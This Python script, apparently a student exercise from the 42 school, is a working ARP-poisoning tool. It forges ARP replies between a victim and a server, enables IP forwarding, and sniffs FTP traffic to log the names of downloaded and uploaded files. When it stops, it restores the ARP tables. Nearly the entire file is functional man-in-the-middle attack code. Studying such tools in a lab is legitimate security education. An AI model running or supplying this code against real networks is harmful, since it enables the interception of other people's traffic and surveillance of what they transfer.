#!/bin/env python3
# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    inquisitor.py                                      :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: yitani <yitani@student.42.fr>              +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/11/13 12:30:34 by yitani            #+#    #+#              #
#    Updated: 2025/11/13 12:30:39 by yitani           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

from scapy.all import Ether, ARP, send, sniff, get_if_hwaddr, Raw, sendp
from scapy.layers.inet import TCP
import netifaces
from time import sleep
from sys import argv
import argparse
from os import geteuid, system
import threading

def	get_default_interface():
	gateways = netifaces.gateways()
	return gateways['default'][netifaces.AF_INET][1]

def	poison_loop():
	interface = get_default_interface()
	my_mac = get_if_hwaddr(interface)
	arp_reply_victim = Ether(dst=mac_src) / ARP(op=2, psrc=ip_target, hwsrc=my_mac, pdst=ip_src, hwdst=mac_src)
	arp_reply_server = Ether(dst=mac_target) / ARP(op=2, psrc=ip_src, hwsrc=my_mac, pdst=ip_target, hwdst=mac_target)
	try:
		while (True):
			sendp(arp_reply_server, verbose=False, iface=interface)
			sendp(arp_reply_victim, verbose=False, iface=interface)
			sleep(2)
	except KeyboardInterrupt:
		pass

def restore_tables():
	interface = get_default_interface()
	restore_victim = Ether(dst=mac_src) / ARP(op=2, psrc=ip_target, hwsrc=mac_target, pdst=ip_src, hwdst=mac_src)
	restore_server = Ether(dst=mac_target) / ARP(op=2, psrc=ip_src, hwsrc=mac_src, pdst=ip_target, hwdst=mac_target)
	for _ in range(3):
		sendp(restore_victim, verbose=False, iface=interface)
		sendp(restore_server, verbose=False, iface=interface)

def process_packet(packet):
	if packet.haslayer(TCP) and packet.haslayer(Raw):
		if packet[TCP].sport == 21 or packet[TCP].dport == 21:
			try:
				payload = packet[Raw].load
				data = payload.decode('utf-8', errors='ignore').strip()
				if data.startswith('RETR '):
					print("[DOWNLOAD]", data.split()[1])
				if data.startswith('STOR '):
					print("[UPLOAD]", data.split()[1])
			except:
				pass
if (len(argv) < 5):
	print("Usage: inquisitor.py <IP-src> <MAC-src> <IP-target> <MAC-target> [-v]")
	exit(1)

if geteuid() != 0:
	print("[!] Error: This script requires root privileges")
	print("[!] Run with: sudo python3 inquisitor.py ...")
	exit(1)

parser = argparse.ArgumentParser(description="ARP Poisoning Tool")
parser.add_argument("ip_src", help="Source IP address")
parser.add_argument("mac_src", help="Source MAC address")
parser.add_argument("ip_target", help="Target IP address")
parser.add_argument("mac_target", help="Target MAC address")

args = parser.parse_args()

ip_src = args.ip_src
mac_src = args.mac_src
ip_target = args.ip_target
mac_target = args.mac_target
try:
	system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	poison_thread = threading.Thread(target=poison_loop)
	poison_thread.daemon = True
	poison_thread.start()

	sniff(filter="tcp port 21", prn=process_packet, store=False)
except (Exception, KeyboardInterrupt):
	print("STOPPING ATTACK")
finally:
	restore_tables()
	print("\nARP TABLES RESTORED")
